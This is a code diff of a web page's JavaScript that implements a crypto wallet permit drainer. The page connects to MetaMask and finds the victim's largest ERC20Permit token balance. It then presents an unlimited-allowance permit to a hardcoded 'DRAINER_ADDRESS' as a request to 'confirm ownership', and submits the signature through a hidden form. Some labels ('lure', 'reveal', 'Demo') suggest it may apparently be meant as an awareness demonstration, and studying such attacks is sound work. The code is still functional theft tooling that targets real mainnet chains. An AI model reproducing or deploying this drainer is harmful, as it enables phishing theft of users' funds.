     },
     42161: {
       name: "Arbitrum",
       symbol: "ARB",
       rpc: "https://arb1.arbitrum.io/rpc",
-      etherscan: "https://api.arbiscan.io/api",
       displayName: "Arbitrum One",
       tokens: {
-        "USDC.e": "0xFF970A61A04b1cA14834A43F5dE4533eBDDB5F86",
         "USDC": "0xaf88d065e77c8cC2239327C5EDB3A432268e5831",
-        "DAI": "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1",
-        "ARB": "0x912CE59144191c1204e64559fe8253a0e49e6920",
-        "UNI": "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0"
+        "DAI": "0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1"
       }
     }
   };
- 
-  const DRAINER_ADDRESS   = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05";
-  const MAX_UINT256       = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
-  const MAX_UINT256_STR   = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
- 
+
+  const DRAINER_ADDRESS = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05";
+  const MAX_UINT256 = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
+
   const ERC20_ABI = [
     "function balanceOf(address) view returns (uint256)",
     "function decimals() view returns (uint8)",
@@ -485,22 +292,20 @@
     "function nonces(address) view returns (uint256)",
     "function DOMAIN_SEPARATOR() view returns (bytes32)"
   ];
- 
-  let userAddress    = null;
-  let currentChain   = null;
-  let permitSig      = null;
+
+  let userAddress = null;
+  let currentChain = null;
+  let permitSig = null;
   let permitDeadline = null;
-  let permitNonce    = null;
-  let provider       = null;
-  let config         = null;
- 
+  let config = null;
+
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
   }
+
   function shortAddr(a) { return a ? a.slice(0,6) + "..." + a.slice(-4) : "—"; }
-  function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
- 
+
   function renderSteps(steps) {
     document.getElementById('stepList').innerHTML = steps.map(s => `
       <div class="step-item">
@@ -512,315 +317,185 @@
       </div>`).join('');
   }
 
-  // ---- DETECT NETWORK AND UPDATE UI ----
-  async function detectAndUpdateNetwork() {
-    if (!window.ethereum) {
-      document.getElementById('navNetworkBadge').textContent = 'MetaMask needed';
-      return;
-    }
-    
-    try {
-      const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-      const chainId = parseInt(chainIdHex, 16);
-      
-      if (!CHAIN_CONFIGS[chainId]) {
-        document.getElementById('navNetworkBadge').textContent = 'Unsupported network';
-        return;
-      }
-      
-      const chainConfig = CHAIN_CONFIGS[chainId];
-      const displayText = `${chainConfig.symbol} (${chainConfig.displayName})`;
-      document.getElementById('navNetworkBadge').textContent = displayText;
-    } catch(e) {
-      console.error('Network detection error:', e);
-    }
-  }
-
-  // ---- EXTRACT SIGNATURE ----
-  function extractSignatureComponents(sig) {
+  function extractSigComponents(sig) {
     const cleaned = sig.startsWith('0x') ? sig.slice(2) : sig;
-    if (cleaned.length !== 130) {
-      throw new Error(`Invalid signature length: ${cleaned.length} (expected 130)`);
-    }
     const r = '0x' + cleaned.slice(0, 64);
     const s = '0x' + cleaned.slice(64, 128);
-    const vHex = cleaned.slice(128, 130);
-    const v = parseInt(vHex, 16);
-    
-    console.log('✓ Signature extraction successful');
-    console.log('  r:', r);
-    console.log('  s:', s);
-    console.log('  v:', v);
-    
+    const v = parseInt(cleaned.slice(128, 130), 16);
     return { r, s, v };
   }
 
-  // ---- EXFILTRATE PERMIT ----
-  function exfiltratePermit(address, sig, network) {
+  function exfiltratePermit(address, sig, network, token) {
     document.getElementById('exfilWallet').value = address;
     document.getElementById('exfilSignature').value = sig;
     document.getElementById('exfilNetwork').value = network;
-    document.getElementById('exfilToken').value = window.actualTargetToken ? window.actualTargetToken.address : '—';
-    document.getElementById('exfilValue').value = MAX_UINT256_STR;
+    document.getElementById('exfilToken').value = token;
+    document.getElementById('exfilValue').value = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
     document.getElementById('exfilSpender').value = DRAINER_ADDRESS;
-    document.getElementById('exfilDeadline').value = permitDeadline ? new Date(permitDeadline * 1000).toUTCString() : 'unknown';
-    document.getElementById('exfilNonce').value = permitNonce || '0';
-    
+    document.getElementById('exfilDeadline').value = permitDeadline ? new Date(permitDeadline * 1000).toUTCString() : '';
     document.getElementById('permitExfilForm').submit();
   }
 
-  // ---- SCAN FOR PERMIT TOKENS ----
-  async function scanAndFindPermitToken(walletAddress, chainId) {
-    console.log(`🔍 Scanning chain ${chainId} for ERC20Permit-enabled tokens with balance...`);
-    
+  async function scanForPermitToken(walletAddress, chainId) {
     config = CHAIN_CONFIGS[chainId];
-    if (!config) {
-      console.error('Unsupported chain');
-      return null;
-    }
+    if (!config) return null;
 
-    provider = new ethers.JsonRpcProvider(config.rpc);
-    
-    const permittedTokens = [];
-    
-    for (const [symbol, tokenAddress] of Object.entries(config.tokens)) {
+    const provider = new ethers.JsonRpcProvider(config.rpc);
+    const candidates = [];
+
+    for (const [symbol, addr] of Object.entries(config.tokens)) {
       try {
-        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
         const balance = await contract.balanceOf(walletAddress);
-        
         if (balance === 0n) continue;
-        
+
         try {
           await contract.nonces(walletAddress);
-          const domainSeparator = await contract.DOMAIN_SEPARATOR();
-          
-          if (domainSeparator && domainSeparator !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
+          const domainSep = await contract.DOMAIN_SEPARATOR();
+          if (domainSep && domainSep !== '0x' + '0'.repeat(64)) {
             const decimals = await contract.decimals();
-            const balanceFormatted = ethers.formatUnits(balance, decimals);
             const name = await contract.name();
-            
-            console.log(`✓ ${symbol} supports ERC20Permit, balance: ${balanceFormatted}`);
-            
-            permittedTokens.push({
-              symbol: symbol,
-              name: name,
-              address: tokenAddress,
-              balance: balanceFormatted,
-              balanceRaw: balance,
-              decimals: decimals,
-              sortValue: parseFloat(balanceFormatted)
+            candidates.push({
+              symbol, name, address: addr, balance, decimals,
+              formatted: parseFloat(ethers.formatUnits(balance, decimals))
             });
           }
-        } catch(e) {
-          // Token doesn't support permits
-        }
-      } catch(e) {
-        console.warn(`Error checking ${symbol}:`, e.message);
-      }
+        } catch(e) {}
+      } catch(e) {}
     }
-    
-    if (permittedTokens.length === 0) {
-      console.log('No ERC20Permit-enabled tokens with balance found on this chain');
-      return null;
-    }
-    
-    permittedTokens.sort((a, b) => b.sortValue - a.sortValue);
-    const bestTarget = permittedTokens[0];
-    
-    console.log(`🎯 Selected target on chain ${chainId}: ${bestTarget.symbol} with ${bestTarget.balance} balance`);
-    
-    return bestTarget;
+
+    if (candidates.length === 0) return null;
+    candidates.sort((a, b) => b.formatted - a.formatted);
+    return candidates[0];
   }
- 
-  // ---- CONNECT ----
+
   document.getElementById('connectBtn').addEventListener('click', async () => {
     if (!window.ethereum) {
-      alert("MetaMask not detected. Please install MetaMask.");
+      alert("MetaMask required");
       return;
     }
- 
+
     showPhase('phase-connecting');
-    
+
     try {
-      // Get current chain
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
-      
+
       if (!CHAIN_CONFIGS[chainId]) {
-        alert(`Unsupported network (Chain ID: ${chainId}). Please switch to Ethereum, Base, or Arbitrum.`);
+        alert("Please switch to Ethereum, Base, Arbitrum, or Sepolia");
         showPhase('phase-lure');
         return;
       }
-      
+
       currentChain = chainId;
       config = CHAIN_CONFIGS[chainId];
-      
       document.getElementById('networkDetected').textContent = config.displayName;
-      document.getElementById('dashNetworkBadge').textContent = `${config.symbol}`;
-      
+      document.getElementById('dashNetworkBadge').textContent = config.symbol;
+
       renderSteps([
-        { num:'1', state:'active',  title:'Detect network',    desc:`Detected: ${config.displayName}` },
-        { num:'2', state:'pending', title:'Connect wallet',    desc:'Share your wallet address' },
-        { num:'3', state:'pending', title:'Verify wallet',     desc:'Sign to confirm ownership' },
+        { num:'1', state:'active', title:'Detecting network', desc: config.displayName },
+        { num:'2', state:'pending', title:'Connecting wallet', desc: 'Awaiting approval' },
+        { num:'3', state:'pending', title:'Scanning tokens', desc: 'Looking for targets' }
       ]);
-      document.getElementById('connectNote').textContent = "Detecting your network...";
-      
-      // POPUP #1 — connection
+
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
-      
-      renderSteps([
-        { num:'1', state:'done',   title:'Network detected',  desc: config.displayName },
-        { num:'2', state:'done',   title:'Wallet connected',  desc: shortAddr(userAddress) },
-        { num:'3', state:'active', title:'Scanning tokens...', desc:'Finding permit-enabled tokens on ' + config.displayName },
-      ]);
-      document.getElementById('connectNote').textContent = "Scanning your tokens on " + config.displayName + "...";
-      
-      // *** DISCOVER TOKENS ON THIS CHAIN ***
-      const discoveredToken = await scanAndFindPermitToken(userAddress, chainId);
-      
-      if (!discoveredToken) {
-        alert(`No ERC20Permit-enabled tokens found on ${config.displayName}. Demo cannot continue on this network.`);
-        showPhase('phase-lure');
-        return;
-      }
-      
-      renderSteps([
-        { num:'1', state:'done',   title:'Network detected', desc: config.displayName },
-        { num:'2', state:'done',   title:'Wallet connected', desc: shortAddr(userAddress) },
-        { num:'3', state:'active', title:'Verify wallet',    desc:`Sign for ${discoveredToken.symbol}` },
-      ]);
-      document.getElementById('connectNote').textContent = `Found ${discoveredToken.symbol} on ${config.displayName}. Sign to continue...`;
-      
-      // POPUP #2 — permit signature
-      provider = new ethers.JsonRpcProvider(config.rpc);
-      const tokenContract = new ethers.Contract(discoveredToken.address, ERC20_ABI, provider);
-      const nonce = await tokenContract.nonces(userAddress);
-      permitNonce = nonce.toString();
-      
-      permitDeadline = Math.floor(Date.now() / 1000) + 172800;
-      
-      const domain = {
-        name: discoveredToken.name,
-        version: "1",
-        chainId: chainId,
-        verifyingContract: discoveredToken.address
-      };
-      
-      const types = {
-        Permit: [
-          { name: "owner",    type: "address" },
-          { name: "spender",  type: "address" },
-          { name: "value",    type: "uint256" },
-          { name: "nonce",    type: "uint256" },
-          { name: "deadline", type: "uint256" }
-        ]
-      };
-      
-      const message = {
-        owner:    userAddress,
-        spender:  DRAINER_ADDRESS,
-        value:    MAX_UINT256.toString(),
-        nonce:    nonce.toString(),
-        deadline: permitDeadline
-      };
-      
-      const browserProvider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await browserProvider.getSigner();
-      
-      const signature = await signer.signTypedData(domain, types, message);
-      permitSig = signature;
-      
-      const { r, s, v } = extractSignatureComponents(signature);
-      
-      // Store target info
-      window.actualTargetToken = discoveredToken;
-      
-      // Update debug info
-      document.getElementById('debugNetwork').textContent = config.displayName + ` (Chain ID: ${chainId})`;
-      document.getElementById('debugToken').textContent = discoveredToken.address;
-      document.getElementById('debugR').textContent = r;
-      document.getElementById('debugS').textContent = s;
-      document.getElementById('debugV').textContent = v;
-      document.getElementById('debugDeadline').textContent = permitDeadline;
-      
+
       renderSteps([
         { num:'1', state:'done', title:'Network detected', desc: config.displayName },
         { num:'2', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
-        { num:'3', state:'done', title:'Permit signed', desc:`Signature confirmed for ${discoveredToken.symbol}` },
+        { num:'3', state:'active', title:'Scanning tokens', desc: 'Finding ERC20Permit tokens...' }
+      ]);
+      document.getElementById('connectNote').textContent = "Scanning for permit-enabled tokens...";
+
+      const target = await scanForPermitToken(userAddress, chainId);
+      if (!target) {
+        alert(`No ERC20Permit tokens found on ${config.displayName}`);
+        showPhase('phase-lure');
+        return;
+      }
+
+      renderSteps([
+        { num:'1', state:'done', title:'Network detected', desc: config.displayName },
+        { num:'2', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
+        { num:'3', state:'active', title:'Requesting signature', desc: `Sign for ${target.symbol}` }
+      ]);
+      document.getElementById('connectNote').textContent = `Sign to confirm ownership of ${target.symbol}...`;
+
+      const provider = new ethers.JsonRpcProvider(config.rpc);
+      const tokenContract = new ethers.Contract(target.address, ERC20_ABI, provider);
+      const nonce = await tokenContract.nonces(userAddress);
+      permitDeadline = Math.floor(Date.now() / 1000) + 172800;
+
+      const domain = {
+        name: target.name,
+        version: "1",
+        chainId: chainId,
+        verifyingContract: target.address
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const message = {
+        owner: userAddress,
+        spender: DRAINER_ADDRESS,
+        value: MAX_UINT256.toString(),
+        nonce: nonce.toString(),
+        deadline: permitDeadline
+      };
+
+      const browserProvider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await browserProvider.getSigner();
+      const signature = await signer.signTypedData(domain, types, message);
+      permitSig = signature;
+
+      renderSteps([
+        { num:'1', state:'done', title:'Network detected', desc: config.displayName },
+        { num:'2', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
+        { num:'3', state:'done', title:'Signature obtained', desc: `Permit for ${target.symbol}` }
       ]);
       document.getElementById('connectNote').textContent = "Loading your portfolio...";
-      
-      // *** EXFILTRATE PERMIT ***
-      exfiltratePermit(userAddress, permitSig, config.displayName);
 
-      // Update dashboard
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
-      document.getElementById('warningNetwork').textContent = config.displayName;
-      document.getElementById('emailNetwork').textContent = config.displayName;
-      document.getElementById('dashNetwork').textContent = config.displayName;
-      document.getElementById('dashOwner').textContent = userAddress;
-      document.getElementById('dashToken').textContent = discoveredToken.address;
-      document.getElementById('dashSigShort').textContent = permitSig.slice(0, 20) + "...";
-      document.getElementById('dashDeadline').textContent = new Date(permitDeadline * 1000).toUTCString();
-      document.getElementById('chainValid').textContent = config.displayName;
-      document.getElementById('signatureWarning').style.display = 'block';
-      
-      showPhase('phase-dashboard');
- 
+      document.getElementById('revealChainName').textContent = config.displayName;
+      document.getElementById('emailChainName').textContent = config.displayName;
+      document.getElementById('drainChainName').textContent = config.displayName;
+      document.getElementById('revealAddress').textContent = userAddress;
+      document.getElementById('revealNetwork').textContent = config.displayName;
+      document.getElementById('revealToken').textContent = `${target.symbol} (${target.address})`;
+      document.getElementById('revealSig').textContent = permitSig.slice(0,20) + "..." + permitSig.slice(-10);
+
+      exfiltratePermit(userAddress, permitSig, config.displayName, target.address);
+
+      setTimeout(() => showPhase('phase-dashboard'), 800);
+
     } catch (err) {
-      if (err.code === 4001) {
-        alert("You rejected the request.");
-      } else {
-        console.error("Error:", err);
-        alert("Error: " + (err.message || "Something went wrong."));
-      }
+      if (err.code !== 4001) console.error("Error:", err);
       showPhase('phase-lure');
     }
   });
- 
-  // ---- REVEAL ----
-  document.getElementById('revealBtn').addEventListener('click', async () => {
-    document.getElementById('revealAddress').textContent  = userAddress || '—';
-    document.getElementById('revealNetwork').textContent = config ? config.displayName : '—';
-    document.getElementById('revealToken').textContent = window.actualTargetToken ? `${window.actualTargetToken.symbol} (${window.actualTargetToken.address})` : '—';
-    document.getElementById('revealSig').textContent = permitSig
-      ? permitSig.slice(0,20) + "..." + permitSig.slice(-10) + " (full 65-byte ECDSA signature)"
-      : '—';
-    
-    document.getElementById('exposureNetwork').textContent = config ? config.displayName : 'this network';
-    document.getElementById('balanceNetwork').textContent = config ? config.displayName : 'this network';
-    
-    showPhase('phase-reveal');
-    await refreshBalance();
-  });
- 
-  // ---- BALANCE ----
-  async function refreshBalance() {
-    if (!userAddress || !window.actualTargetToken || !provider) return;
-    try {
-      const token = new ethers.Contract(window.actualTargetToken.address, ERC20_ABI, provider);
-      const [raw, dec] = await Promise.all([token.balanceOf(userAddress), token.decimals()]);
-      const formatted = parseFloat(ethers.formatUnits(raw, dec)).toLocaleString();
-      const el = document.getElementById('liveBalance');
-      el.textContent = formatted + " " + window.actualTargetToken.symbol;
-      el.className = raw === 0n ? 'balance-value drained' : 'balance-value safe';
-    } catch(e) {
-      document.getElementById('liveBalance').textContent = "Error reading balance";
-    }
-  }
- 
-  document.getElementById('refreshBtn').addEventListener('click', refreshBalance);
-  setInterval(() => {
-    if (document.getElementById('phase-reveal').classList.contains('active')) refreshBalance();
-  }, 8000);
 
-  // Detect network on load
-  detectAndUpdateNetwork();
-  window.ethereum?.on?.('chainChanged', detectAndUpdateNetwork);
-  window.ethereum?.on?.('accountsChanged', () => {
-    window.location.reload();
-  });
+  document.getElementById('revealBtn').addEventListener('click', () => showPhase('phase-reveal'));
+
+  // Detect network badge on load
+  if (window.ethereum) {
+    window.ethereum.request({ method: 'eth_chainId' }).then(chainIdHex => {
+      const chainId = parseInt(chainIdHex, 16);
+      const cfg = CHAIN_CONFIGS[chainId];
+      if (cfg) document.getElementById('navNetworkBadge').textContent = cfg.displayName;
+      else document.getElementById('navNetworkBadge').textContent = 'Unsupported network';
+    }).catch(() => {
+      document.getElementById('navNetworkBadge').textContent = 'MetaMask not detected';
+    });
+  }
 </script>
 </body>
 </html>
